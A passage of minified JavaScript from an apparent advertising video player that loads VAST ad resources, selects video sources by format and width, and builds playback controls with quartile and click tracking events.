            r.getEvents("unmute").forEach(function (e, t) {
              n.externalTrack("Vast:unmute:" + (t + 1), e);
            });
          }), e.subscribe("firstQuartile", function () {
            r.getEvents("firstQuartile").forEach(function (e, t) {
              n.externalTrack("Vast:firstQuartile:" + (t + 1), e);
            });
          }), e.subscribe("midpoint", function () {
            r.getEvents("midpoint").forEach(function (e, t) {
              n.externalTrack("Vast:midpoint:" + (t + 1), e);
            });
          }), e.subscribe("thirdQuartile", function () {
            r.getEvents("thirdQuartile").forEach(function (e, t) {
              n.externalTrack("Vast:thirdQuartile:" + (t + 1), e);
            });
          }), e.subscribe("rewind", function () {
            r.getEvents("rewind").forEach(function (e, t) {
              n.externalTrack("Vast:rewind:" + (t + 1), e);
            });
          }));
        }, t.prototype._bindVideoEvents = function () {
          e.prototype._bindVideoEvents.call(this, {
            sdk: "VAST",
            type: "video-only"
          });
        }, t.prototype._createVastResource = function () {
          var e = this,
            t = c.get(e).di,
            r = t.jDOM,
            n = t.jModel.getData("resources.jsResource");
          n && 0 !== n.length && (r.createElement(e.getPrefix() + "vast-res-" + e.getId(), {
            tag: "div",
            parent: e.getPrefix() + "wrapper-" + e.getId(),
            attributes: {
              class: e.getPrefix() + "vast-res"
            }
          }), n.forEach(function (t) {
            r.createElement(e.getPrefix() + "vast-res-source" + Math.floor(1e8 * Math.random()), {
              tag: "script",
              parent: e.getPrefix() + "vast-res-" + e.getId(),
              attributes: {
                src: t
              }
            });
          }));
        }, t.prototype._getBestVideoSources = function () {
          var e = c.get(this).di,
            t = e.jModel,
            r = e.jProductApi,
            n = r.getFormat(),
            o = r.returnSiteWidth() ? r.returnSiteWidth() : 1020,
            i = t.getData("videosAttributes"),
            a = t.getData("types"),
            s = t.getData("videos"),
            l = [];
          if (i) {
            for (var d = i.map(function (e, t) {
                return {
                  src: s[t],
                  width: i[t].width,
                  height: i[t].height,
                  bitrate: i[t].bitrate,
                  types: a[t]
                };
              }), u = d.length, p = 0, f = !0, h = l.length, g = 0; g < u; g++) if ("video/webm" === d[g].types) if ("wp" === n) {
              if (d[g].width > p) {
                if (p > o) break;
                f || delete l[h - 1], l.push({
                  src: d[g].src,
                  types: d[g].types
                }), p = d[g].width, f = !1, h++;
              }
            } else l.push({
              src: d[g].src,
              types: d[g].types
            });
            p = 0, f = !0, h = l.length;
            for (var v = 0; v < u; v++) if ("video/mp4" === d[v].types) if ("wp" === n) {
              if (d[v].width > p) {
                if (p > o) break;
                f || delete l[h - 1], l.push({
                  src: d[v].src,
                  types: d[v].types
                }), p = d[v].width, f = !1, h++;
              }
            } else l.push({
              src: d[v].src,
              types: d[v].types
            });
            for (var m = 0; m < u; m++) if ("video/ogg" === d[m].types) if ("wp" === n) {
              if (d[m].width > p) {
                if (p > o) break;
                f || delete l[h - 1], l.push({
                  src: d[m].src,
                  types: d[m].types
                }), p = d[m].width, f = !1, h++;
              }
            } else l.push({
              src: d[m].src,
              types: d[m].types
            });
            p = 0, f = !0, h = l.length;
            for (var y = 0; y < u; y++) if ("video/3gpp" === d[y].types) if ("wp" === n) {
              if (d[y].width > p) {
                if (p > o) break;
                f || delete l[h - 1], l.push({
                  src: d[y].src,
                  types: d[y].types
                }), p = d[y].width, f = !1, h++;
              }
            } else l.push({
              src: d[y].src,
              types: d[y].types
            });
            if (0 === Object.keys(l).length) for (var b = 0; b < u; b++) l.push({
              src: d[b].src,
              types: d[b].types
            });
          } else for (var w = 0; w < s.length; w++) l.push({
            src: s[w],
            types: a[w]
          });
          return l;
        }, t.prototype._prepareVideo = function () {
          var e = this;
          return c.get(e).di.jModel.ready().then(function () {
            e._createVastResource();
          }).then(function () {
            o.default.info("JPlayerVast: Vast loaded."), e._bindVastSources(), e._bindVastEvents(), e._bindVideoEvents(), e._bindVideoControlsEvents(), e.publish("vastPlayerReady", [e]), o.default.info("JPlayerVast: Ready to play.");
          }).catch(function (t) {
            e.publish("vastError", [t]), o.default.error(t);
          }), e;
        }, t.prototype.ready = function () {
          return Promise.all(this._promises).then(function (e) {
            return e;
          });
        }, t;
      }(n.default);
    t.default = l;
  },
  210: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }(r(1)).default.getTopScope(),
      o = {
        getToTopScrolled: function () {
          var e = n.document,
            t = n.innerHeight || (e.documentElement || e.body).clientHeight,
            r = function () {
              var e = n.document;
              return Math.max(e.body.scrollHeight, e.documentElement.scrollHeight, e.body.offsetHeight, e.documentElement.offsetHeight, e.body.clientHeight, e.documentElement.clientHeight);
            }() - t,
            o = n.pageYOffset || (e.documentElement || e.body.parentNode || e.body).scrollTop;
          return {
            pixel: o,
            percent: o / r
          };
        },
        getDocHeight: function (e) {
          var t = e;
          return Math.max(t.body.scrollHeight, t.documentElement.scrollHeight, t.body.offsetHeight, t.documentElement.offsetHeight, t.body.clientHeight, t.documentElement.clientHeight);
        },
        getElementRects: function (e) {
          var t = e.getBoundingClientRect();
          return {
            offset: Math.round(e.offsetHeight),
            top: Math.round(t.top),
            bottom: Math.round(t.bottom),
            height: Math.round(t.height)
          };
        },
        getPositionFromTop: function (e) {
          return e.getBoundingClientRect().top + n.scrollY || "";
        },
        checkCorrectPosition: function (e) {
          var t = e.getBoundingClientRect().top + n.scrollY || 2e3,
            r = this.getToTopScrolled(),
            o = n.innerHeight || (doc.documentElement || doc.body).clientHeight,
            i = r.pixel;
          return !(i + o < t - o * (2 / 3)) && (-1 * (t - (o + i)) <= e.getBoundingClientRect().height || t + e.getBoundingClientRect().height + t - (o + i) > 0);
        }
      };
    t.default = o;
  },
  23: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = c(r(4)),
      o = c(r(2)),
      i = c(r(16)),
      a = c(r(1)),
      s = c(r(59));
    c(r(33));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function l(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var d = a.default.getTopScope(),
      u = new WeakMap(),
      p = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this, r));
          return n._setPrivates(r), n;
        }
        return l(t, e), t.prototype._addFullscreenClass = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
            t = this.returnVideoWrapper();
          t.addClass && (e ? t.addClass("jpx--video@fullscreen") : t.removeClass("jpx--video@fullscreen"));
        }, t.prototype._addPoster = function (e, t) {
          var r = u.get(this).di.jDOM.getElement(e);
          if (t && -1 !== r) {
            var n = new XMLHttpRequest();
            n.open("GET", t, !0), n.onload = function () {
              if (200 === n.status) {
                var e = r.getDOMElement();
                e && e.setAttribute("poster", t);
              }
            }, n.send();
          }
        }, t.prototype._apiBlockTracking = function () {
          var e = u.get(this);
          return !(!e.isCustomApiVideo || !e.isCustomApiVideo) && !e.apiVtrResetOnEnd && e.apiVideoPlayedOnce;
        }, t.prototype._apiCheckIfVideoHasLoop = function () {
          var e = this.getPrefix(),
            t = this.getId(),
            r = u.get(this),
            n = r.di.jDOM;
          if (r.isCustomApiVideo && !(r.apiVideoHasLoop || r.apiVideoPlayedOnce || 2 < this.getCurrentTime())) {
            var o = e + "container-" + t,
              i = n.getElement(o).getDOMElement();
            -1 !== i && i.loop && (r.apiVideoHasLoop = !0);
          }
        }, t.prototype._apiEndedHack = function () {
          u.get(this).isCustomApiVideo && this._eventEndedListener(this);
        }, t.prototype._apiPublishStartHack = function (e) {
          var t = u.get(this);
          if (t.isCustomApiVideo) {
            var r = t.pastEvents;
            2 === this._playCount && r.started && (r.started = !0, this.publish("start", [e]));
          }
        }, t.prototype._apiRewindHack = function (e) {
          var t = u.get(this);
          t.isCustomApiVideo && !t.apiRewindFiredOnce && t.apiVideoHasLoop && e < 5 && t.apiVideoPlayedOnce && (this._started = !0, t.apiRewindFiredOnce = !0, this.publish("rewind", []));
        }, t.prototype._bindBlurEvent = function (e) {
          var t = this,
            r = u.get(t),
            n = r.di.jDOM;
          r.blurEvent = n.bind("@scope", "blur", function () {
            o.default.delay(t, function () {
              t.publish("blur", [t, e], 0), e && e.fromApi || t.pause("add");
            }, 100);
          }, !1);
        }, t.prototype._bindFocusEvent = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
            t = this,
            r = u.get(t),
            n = r.di.jDOM;
          e ? n.bind("@scope", "focus", function () {
            t.publish("focus", [t], 0);
          }) : r.focusEvent = n.bind("@scope", "focus", function () {
            o.default.delay(t, function () {
              t.isPlaying() || (t.play("remove"), t.publish("focus", [t], 0));
            }, 200);
          });
        }, t.prototype._bindFullscreenEvent = function () {
          var e = this,
            t = u.get(e),
            r = t.di.jDOM,
            n = function () {
              t.onFullscreen && (t.onFullscreen = !1, e._addFullscreenClass(!1), e._changeVideoFullscreenBtn(!1), e.publish("offFullscreen"));
            };
          t.webkitfullscreenchangeEvent = r.bind("@scope", "webkitfullscreenchange", function () {
            d.document.fullscreenElement || d.document.webkitIsFullScreen || d.document.mozFullScreen || n();
          }), t.fullscreenchangeEvent = r.bind("@scope", "fullscreenchange", function () {
            d.document.fullscreenElement || d.document.webkitIsFullScreen || d.document.mozFullScreen || n();
          });
        }, t.prototype._bindHalfscreenEvent = function () {
          var e = this,
            t = u.get(e),
            r = t.di.jDOM;
          t.orientation = s.default.isPortrait(), t.halfscreenResizeEvent = r.bind("@scope", "optimizedResize", function () {
            t.orientation !== s.default.isPortrait() && (t.orientation = s.default.isPortrait(), e._changeVideoFullscreenBtn(!1));
          });
        }, t.prototype._bindMouseEvent = function () {
          var e = u.get(this),
            t = e.di.jDOM;
          e.mouseupEvent = t.bind("@scope", "mouseup", function () {
            e.videoVolumeBarBtnDown = !1;
          });
        }, t.prototype._bindMuteEvent = function (e) {
          var t = this;
          u.get(t).di.jDOM.getScope().addEventListener("blur", function () {
            t.publish("blur", [t, e]), e && e.fromApi || t.pause();
          }, !1);
        }, t.prototype._bindVideoControlsEvents = function () {
          var e = this,
            t = e.getPrefix(),
            r = e.getId(),
            n = u.get(e),
            o = n.di.jDOM;
          n.playerOpts.customControls && (e.subscribe("progress", function () {
            o.getElement(t + "control-progress-update-" + r).setStyle("width", e.getCurrentTimeInPercent() + "%");
          }), e.subscribe("ended", function () {
            var e = o.getElement(t + "control-play-" + r);
            o.getElement(t + "control-progress-update-" + r).setStyle("width", "0"), n.progressBarInterval(), e.addClass("jpx-video-control-play"), e.addClass("jpx-video-control-reload");
          }));
        }, t.prototype._returnTrackingInfo = function (e) {
          var t = u.get(this),
            r = t.di,
            n = r.jTracking,
            o = r.videoName;
          n.videoTracking([{
            player: {
              sdk: t.trackingSdk,
              height: this.getVideoHeight(),
              width: this.getVideoWidth(),
              id: o || ""
            },
            creative: {
              type: t.trackingType
            },
            action: {
              type: e.type,
              emitted: e.emitted,
              playback: this.getCurrentTime()
            },
            site: {}
          }]);
        }, t.prototype._bindVideoEvents = function (e) {
          var t = this,
            r = u.get(t);
          r.di.jTracking && !r.trackingDisabled && (e && (r.trackingSdk = e.sdk ? e.sdk : "CUSTOM", r.trackingType = e.type ? e.type : "custom-rich-media"), t.subscribe("richVideo", function () {
            r.trackingType = "rich-video";
          }), t.subscribe("userClick", function () {
            t._returnTrackingInfo({
              type: "CLICK",
              emitted: "user"
            });
          }), t.subscribe("complete", function () {
            t._apiBlockTracking() || (t._returnTrackingInfo({
              type: "COMPLETE",
              emitted: "auto"
            }), r.apiVideoPlayedOnce = !0);
          }), t.subscribe("firstQuartile", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "FIRST_QUARTILE",
              emitted: "auto"
            });
          }), t.subscribe("midpoint", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "MIDPOINT",
              emitted: "auto"
            });
          }), t.subscribe("pauseClicked", function () {
            t._returnTrackingInfo({
              type: "PAUSED",
              emitted: "user"
            });
          }), t.subscribe("pause", function () {
            t._apiBlockTracking() || r.videoNewControls || t.getCurrentTimeInPercent() < 98 && t._returnTrackingInfo({
              type: "PAUSED",
              emitted: "auto"
            });
          }), t.subscribe("play", function () {
            t._apiBlockTracking() || r.videoNewControls || t.isPlaying() || (t._returnTrackingInfo({
              type: "PLAY",
              emitted: "auto"
            }), t._resetApiVideoPlayerOnce());
          }), t.subscribe("resume", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "RESUMED",
              emitted: "auto"
            });
          }), t.subscribe("rewind", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "REWIND",
              emitted: "auto"
            });
          }), t.subscribe("start", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "STARTED",
              emitted: "auto"
            });
          }), t.subscribe("playClicked", function () {
            t._returnTrackingInfo({
              type: "PLAY",
              emitted: "user"
            });
          }), t.subscribe("thirdQuartile", function () {
            t._apiBlockTracking() || t._returnTrackingInfo({
              type: "THIRD_QUARTILE",
              emitted: "auto"
            });
          }), t.subscribe("userClose", function () {
            t._returnTrackingInfo({
              type: "USER_CLOSE",
              emitted: "user"
            });
          }), t.subscribe("unmuteClicked", function () {
            t._returnTrackingInfo({
              type: "VOLUME_CHANGED",
              emitted: "user"
            });
          }), t.subscribe("unmute", function () {
            t._apiBlockTracking() || t.isMuted() || t._returnTrackingInfo({
              type: "VOLUME_CHANGED",
              emitted: "auto"
            });
          }), t.subscribe("mute", function () {
            t._apiBlockTracking() || t.isMuted() || t._returnTrackingInfo({
              type: "VOLUME_MUTED",
              emitted: "auto"
            });
          }), t.subscribe("muteClicked", function () {
            t._returnTrackingInfo({
              type: "VOLUME_MUTED",
              emitted: "user"
            });
          }));
        }, t.prototype._bindVideoSources = function () {
          var e = this,
            t = u.get(e),
            r = t.di.jModel,
            n = t.di.jDOM;
          r.getData("sources").forEach(function (t, r) {
            n.createElement(e.getPrefix() + "source-" + r + "-" + e.getId(), {
              tag: "source",
              parent: e.getPrefix() + "container-" + e.getId(),
              attributes: {
                src: t.src,
                type: t.type
              }
            });
          });
        }, t.prototype._changeVideoFullscreenBtn = function (e) {
          var t = u.get(this);
          t.videoControls.fullscreen && (e ? t.videoControls.fullscreen.forEach(function (e) {
            e.addClass("jpx-state-fullscreen");
          }) : t.videoControls.fullscreen.forEach(function (e) {
            e.removeClass("jpx-state-fullscreen");
          }));
        }, t.prototype._changeVideoPlayBtn = function (e) {
          var t = u.get(this);
          t.videoControls.play && (e ? t.videoControls.play.forEach(function (e) {
            e.removeClass("jpx-state-paused");
          }) : t.videoControls.play.forEach(function (e) {
            e.addClass("jpx-state-paused");
          }));
        }, t.prototype._changeVideoVolumeBtn = function (e) {
          var t = u.get(this);
          t.videoControls.volume && (e ? t.videoControls.volume.forEach(function (e) {
            e.removeClass("jpx-state-unmuted");
          }) : t.videoControls.volume.forEach(function (e) {
            e.addClass("jpx-state-unmuted");
          }));
        }, t.prototype._checkVideoCursorPosition = function () {
          var e = this,
            t = u.get(e),
            r = e.getCurrentTime() / e.getDuration() * 100,
            n = t.pastEvents;
          if (r) {
            r < 25 && n.completed && e._resetPastEvents(), e._apiRewindHack(r), r >= 25 && r < 50 && !n.firstQuartile && (n.firstQuartile = !0, e.publish("firstQuartile", [e])), r >= 50 && r < 75 && !n.midpoint && (n.midpoint = !0, e.publish("midpoint", [e])), r > 75 && r < 100 && !n.thirdQuartile && (t.apiRewindFiredOnce = !1, n.thirdQuartile = !0, e.publish("thirdQuartile", [e]));
            var o = e.getDuration(),
              i = o - .75 * o,
              a = i - (o - e.getCurrentTime()),
              s = a / i > .75,
              c = !1,
              l = !1;
            e.isPaused() && !t.apiVideoHasLoop ? c = !0 : t.apiVideoHasLoop && a / i > .8 && (l = !0), !n.completed && s && (c || l) && (n.completed = !0, e.publish("complete", [e]), e._apiEndedHack());
          }
        }, t.prototype._createButtons = function () {
          this._hasButtons = !0, this._createButtonPlay(), this._createProgressBar(), this._createButtonSound();
        }, t.prototype._createButtonsContainer = function () {
          var e = this.getPrefix(),
            t = this.getId();
          u.get(this).di.jDOM.createElement(e + "controls-" + t, {
            tag: "div",
            parent: e + "wrapper-" + t,
            attributes: {
              class: "jpx-video-controls"
            }
          }), this._createButtons();
        }, t.prototype._createButtonPlay = function () {
          var e = this,
            t = e.getPrefix(),
            r = u.get(e),
            n = r.di.jDOM;
          n.createElement(t + "control-play-" + e.getId(), {
            tag: "div",
            parent: t + "controls-" + e.getId(),
            events: {
              click: {
                listener: function (o) {
                  var i = n.getElement(t + "control-play-" + e.getId()),
                    a = n.getElement(t + "control-mute-" + e.getId());
                  e.isPlaying() ? (e.pause(), i.addClass("jpx-video-control-play"), e.publish("pauseClicked", [o])) : (r.isPlayClicked = !0, e.play(), e.unmute(), i.removeClass("jpx-video-control-play"), i.removeClass("jpx-video-control-reload"), a.addClass("jpx-video-control-unmuted"), e.publish("playClicked", [o]));
                }
              }
            },
            attributes: {
              title: "Click to play",
              class: "jpx-video-control-pause jpx-video-control-play"
            }
          });
        }, t.prototype._createButtonSound = function () {
          var e = this,
            t = e.getPrefix(),
            r = e.getId(),
            n = u.get(e).di.jDOM;
          n.createElement(t + "control-mute-" + r, {
            tag: "div",
            parent: t + "controls-" + r,
            events: {
              click: {
                listener: function (o) {
                  var i = n.getElement(t + "control-mute-" + r);
                  e.isMuted() ? (n.getElement(t + "control-mute-" + r).setAttribute("title", "Click to mute"), e.unmute(), i.addClass("jpx-video-control-unmuted"), e.publish("unmuteClicked", [o])) : (n.getElement(t + "control-mute-" + r).setAttribute("title", "Click to unmute"), e.mute(), i.removeClass("jpx-video-control-unmuted"), e.publish("muteClicked", [o]));
                }
              }
            },
            attributes: {
              title: "Click to mute",
              class: "jpx-video-control-mute"
            }
          });
        }, t.prototype._createCenterPlayButton = function (e) {
          var t = this;
          u.get(t).di.jDOM.createElement(t.getPrefix() + "controls-button-play-" + t.getId(), {
            tag: "div",
            parent: e,
            events: {
              click: {
                listener: function () {
                  t.play();
                }
              }
            },
            attributes: {
              title: "Click to play",
              class: t.getPrefix() + "control-play jpx-wp-controls-play"
            }
          });
        }, t.prototype._createProgressBar = function () {
          var e = this,
            t = u.get(e).di.jDOM;
          t.createElement(e.getPrefix() + "control-progress-" + e.getId(), {
            tag: "div",
            parent: e.getPrefix() + "controls-" + e.getId(),
            attributes: {
              class: "jpx-video-control-progress"
            }
          }), t.createElement(e.getPrefix() + "control-buffered-" + e.getId(), {
            tag: "div",
            parent: e.getPrefix() + "control-progress-" + e.getId(),
            attributes: {
              class: "jpx-video-control-buffered"
            }
          }), t.createElement(e.getPrefix() + "control-progress-update-" + e.getId(), {
            tag: "div",
            parent: e.getPrefix() + "control-progress-" + e.getId(),
            attributes: {
              class: "jpx-video-control-progress-update"
            }
          });
        }, t.prototype._createVideoControls = function (e) {
          var t = this,
            r = "jp-video-" + (e || t.getId()) + "-";
          u.get(t).di.jDOM.createElement(r + "controls", {
            tag: "div",
            parent: r + "controls-wrapper",
            attributes: {
              class: "jpx-controls"
            }
          }), t._createVideoPlayBtn(e), t._createVideoVolumeBtn(e), t._createVideoVolumeBarBtn(e), t._createVideoFullscreenBtn(e);
        }, t.prototype._createVideoControlsWrapper = function (e, t) {
          var r = this,
            n = "jp-video-" + (e || r.getId()) + "-",
            o = u.get(r),
            i = o.di.jDOM,
            a = t || i.getElement("front-container");
          i.createElement(n + "controls-wrapper", {
            tag: "div",
            parent: a,
            attributes: {
              class: "jpx-controls-wrapper " + (e ? "jpx-controls-wrapper--" + e : "")
            },
            events: {
              mouseenter: {
                listener: function (e) {
                  o.onVideoControls = !0, r.publish("onVideoControls", [e]);
                }
              },
              mouseleave: {
                listener: function (e) {
                  o.onVideoControls = !1, r.publish("offVideoControls", [e]);
                }
              },
              mousemove: {
                listener: function (e) {
                  if (o.videoVolumeBarBtnDown) {
                    var t = i.getElement(n + "controls-volume-bar").getDOMElement().getBoundingClientRect().left;
                    r._updateVolumeBar(e.clientX, t);
                  }
                }
              }
            }
          }), r._createVideoProgress(e), r._createVideoControls(e);
        }, t.prototype._createVideoFullscreenBtn = function (e) {
          var t = this,
            r = "jp-video-" + (e || t.getId()) + "-",
            n = u.get(t),
            o = n.di.jDOM;
          if (n.isFullscreen || n.isHalfscreen) {
            var i = {
              listener: function () {
                n.onFullscreen ? (t.publish("exitFullscreen"), t._requestFullscreen(!1), t._changeVideoFullscreenBtn(!1)) : (t.publish("requestFullscreen"), t._requestFullscreen(!0), t._changeVideoFullscreenBtn(!0));
              }
            };
            o.createElement(r + "controls-fullscreen", {
              tag: "div",
              parent: r + "controls",
              attributes: {
                class: "jpx-fullscreen",
                title: "Enter full screen"
              },
              events: {
                click: i
              }
            }), n.videoControls.fullscreen.push(o.getElement(r + "controls-fullscreen"));
          }
        }, t.prototype._createVideoPlayBtn = function (e) {
          var t = this,
            r = "jp-video-" + (e || t.getId()) + "-",
            n = u.get(t),
            o = n.di.jDOM;
          o.createElement(r + "controls-play", {
            tag: "div",
            parent: r + "controls",
            attributes: {
              class: "jpx-play",
              title: "Play"
            },
            events: {
              click: {
                listener: function (e) {
                  n.playTriggeredByUser = !0, t.isPlaying() ? (t.pause(), n.videoPlayBtnClicked = !1, t._changeVideoPlayBtn(!1), t.publish("pauseClicked", [e], 0)) : (n.isPlayClicked = !0, n.videoPlayBtnClicked = !0, t.play(), t._changeVideoPlayBtn(!0), !t.isMuted() || n.videoVolumeBtnClicked || n.videoSoundDecreased || (t.unmute(), t._changeVideoVolumeBtn(!1), 1 === t.returnVideoContainerElm().volume && (t._updateVolume(100), n.videoControls.volumeBar.slider.forEach(function (e) {
                    e.setStyle("width", "100%");
                  }))), t.publish("playClicked", [e], 0));
                }
              }
            }
          }), t.isAutoplayAllowed() && (t._isPlaying = !0), o.bind("@scope", "blur", function () {
            t._changeVideoPlayBtn(!1);
          }), o.bind("@scope", "focus", function () {
            t._changeVideoPlayBtn(!0);
          }), n.videoControls.play.push(o.getElement(r + "controls-play"));
        }, t.prototype._createVideoProgress = function (e) {
          var t = "jp-video-" + (e || this.getId()) + "-",
            r = u.get(this),
            n = r.di.jDOM;
          n.createElement(t + "controls-progress", {
            tag: "div",
            parent: t + "controls-wrapper",
            attributes: {
              class: "jpx-progress"
            }
          }).createElement(t + "controls-progress-tag", {
            tag: "progress",
            parent: t + "controls-progress"
          }), r.videoControls.progress.tag.push(n.getElement(t + "controls-progress-tag"));
        }, t.prototype._createVideoVolumeBarBtn = function (e) {
          var t = this,
            r = "jp-video-" + (e || t.getId()) + "-",
            n = u.get(t),
            o = n.di.jDOM;
          o.createElement(r + "controls-volume-bar-container", {
            tag: "div",
            parent: r + "controls",
            attributes: {
              class: "jpx-volume-control",
              title: "Volume"
            }
          }).createElement(r + "controls-volume-bar", {
            tag: "div",
            parent: r + "controls-volume-bar-container",
            attributes: {
              class: "jpx-volume-bar",
              title: "Volume"
            },
            events: {
              mousedown: {
                listener: function (e) {
                  n.videoVolumeBarBtnDown = !0;
                  var i = o.getElement(r + "controls-volume-bar").getDOMElement().getBoundingClientRect().left;
                  t._updateVolumeBar(e.clientX, i);
                }
              }
            }
          }).createElement(r + "controls-volume-slider", {
            tag: "div",
            parent: r + "controls-volume-bar",
            attributes: {
              class: "jpx-volume-slider",
              title: "Volume"
            }
          }).createElement(r + "controls-volume-knob", {
            tag: "div",
            parent: r + "controls-volume-slider",
            attributes: {
              class: "jpx-volume-knob",
              title: "Volume"
            }
          }), n.videoControls.volumeBar.bar.push(o.getElement(r + "controls-volume-bar")), n.videoControls.volumeBar.slider.push(o.getElement(r + "controls-volume-slider"));
        }, t.prototype._createVideoVolumeBtn = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
            t = this,
            r = "jp-video-" + (e || t.getId()) + "-",
            n = u.get(t),
            o = n.di.jDOM;
          o.createElement(r + "controls-volume", {
            tag: "div",
            parent: r + "controls",
            attributes: {
              class: "jpx-volume",
              title: "Volume"
            },
            events: {
              click: {
                listener: function (e) {
                  n.muteTriggeredByUser = !0, t.isMuted() ? (t.unmute(), t._isMuted = !1, n.videoVolumeBtnClicked = !1, t._changeVideoVolumeBtn(!1), 0 !== t.returnVideoContainerElm().volume && 1 !== t.returnVideoContainerElm().volume || t._updateVolumeSlider(!1), t.publish("unmuteClicked", [e])) : (t.mute(), t._isMuted = !0, n.videoVolumeBtnClicked = !0, t._changeVideoVolumeBtn(!0), 1 === t.returnVideoContainerElm().volume && t._updateVolumeSlider(), t.publish("muteClicked", [e]));
                }
              }
            }
          }), n.videoControls.volume.push(o.getElement(r + "controls-volume"));
        }, t.prototype._createVideoWrapper = function (e) {
          var t = this,
            r = t.getPrefix(),
            n = u.get(t),
            o = n.di,
            i = o.jStyle,
            s = o.jDOM,
            c = t.getId(),
            l = r + "wrapper-" + c,
            d = r + "container-" + c,
            p = {
              timeupdate: {
                listener: function (e) {
                  t._eventTimeupdateListener(e);
                }
              },
              play: {
                listener: function (e) {
                  t._eventPlayListener(e);
                }
              },
              pause: {
                listener: function (e) {
                  t._eventPauseListener(e);
                }
              },
              ended: {
                listener: function (e) {
                  t._eventEndedListener(e);
                }
              },
              error: {
                listener: function (e) {
                  t._deffer.reject(e);
                }
              }
            };
          a.default.isSafari() ? p.loadedmetadata = {
            listener: function (e) {
              t._deffer.resolve(e), t.publish("loaded", [e]);
            }
          } : p.canplay = {
            listener: function (e) {
              t._deffer.resolve(e), t.publish("loaded", [e]);
            }
          }, s.createElement(l, {
            tag: "div",
            parent: e,
            attributes: {
              class: r + "wrapper"
            },
            events: {
              click: {
                listener: function () {
                  t.started() && (t.play(), t._changeVideoPlayBtn(!0));
                }
              }
            }
          });
          var f = {
              class: d,
              loop: !!n.playerOpts.loop && "loop",
              playsinline: !0,
              muted: !0,
              controls: !!n.playerOpts.controls && "controls",
              preload: !0
            },
            h = n.playerOpts.poster;
          return t.isAutoplayAllowed() && (f.autoplay = !0), s.createElement(d, {
            tag: "video",
            parent: l,
            events: p,
            attributes: f,
            properties: {
              muted: "true"
            }
          }), i && i.addRule(d, {
            selector: "." + r + "container-" + c,
            properties: {
              width: "100%",
              height: "100%",
              "min-width": "100%",
              margin: "0 auto"
            }
          }), t._addPoster(d, h), t;
        }, t.prototype._eventEndedListener = function (e) {
          var t = this,
            r = u.get(t);
          t._isPlaying = !1, t._started = !1, r.videoEnded = !0, r.playerOpts.newControls && t._changeVideoPlayBtn(!1), t.publish("ended", [e]);
        }, t.prototype._eventPauseListener = function (e) {
          var t = this,
            r = t.getPrefix(),
            n = t.getId(),
            o = u.get(t).di.jDOM;
          t.publish("pause", [e], 0), t._isPlaying = !1;
          var i = o.getElement(r + "control-play-" + n);
          -1 !== i && i.addClass("jpx-video-control-play");
        }, t.prototype._eventPlayListener = function (e) {
          var t = this,
            r = u.get(t);
          if (t.publish("play", [e], 0), r.videoEnded = !1, t._started) t.publish("resume", [e], 0);else {
            t._started = !0, t._videoCursorPosition = 0, t._playCount++, t._playCount > 1 && (t.publish("rewind", [e], 0), t._apiPublishStartHack(e));
            var n = r.pastEvents;
            n.started || (n.started = !0, t.publish("start", [e], 0));
          }
        }, t.prototype._eventTimeupdateListener = function (e) {
          var t = this,
            r = u.get(t);
          t.publish("progress", [e]), t._checkVideoCursorPosition(), r.videoControls.progress.tag.forEach(function (e) {
            var r = e.getDOMElement();
            r.max !== t.getDuration() && (r.max = t.getDuration()), r.value = t.getCurrentTime();
          }), t._apiCheckIfVideoHasLoop();
        }, t.prototype._prepareVideo = function () {
          var e = this;
          return u.get(e).di.jModel.ready().then(function () {
            e._bindVideoSources(), e._bindVideoEvents(), e._bindVideoControlsEvents(), e.publish("playerReady", [e]);
          }).catch(function (t) {
            e.publish("error", [t]), i.default.error(t);
          }), e;
        }, t.prototype._resetApiVideoPlayerOnce = function () {
          var e = u.get(this);
          e.videoNewControls && e.apiVideoPlayedOnce && (e.apiVideoPlayedOnce = !1);
        }, t.prototype._resetPastEvents = function () {
          var e = u.get(this);
          e.pastEvents.started = !1, e.pastEvents.firstQuartile = !1, e.pastEvents.midpoint = !1, e.pastEvents.thirdQuartile = !1, e.pastEvents.completed = !1;
        }, t.prototype._requestFullscreen = function (e) {
          var t = this,
            r = u.get(t),
            n = t.returnVideoParentElm();
          if (n) {
            e ? (r.onFullscreen = !0, r.isFullscreen && (t._addFullscreenClass(!0), n.requestFullscreen ? n.requestFullscreen() : n.mozRequestFullScreen ? n.mozRequestFullScreen() : n.webkitRequestFullscreen && n.webkitRequestFullscreen()), t.publish("onFullscreen")) : (r.onFullscreen = !1, r.isFullscreen && (t._addFullscreenClass(!1), d.document.exitFullscreen ? d.document.exitFullscreen() : d.document.mozCancelFullScreen ? d.document.mozCancelFullScreen() : d.document.webkitExitFullscreen && d.document.webkitExitFullscreen()), t.publish("offFullscreen"));
          }
        }, t.prototype._setPrefix = function (e) {
          this._prefix = e || "jp-video-";
        }, t.prototype._setPrivates = function (e) {
          var t = this,
            r = {};
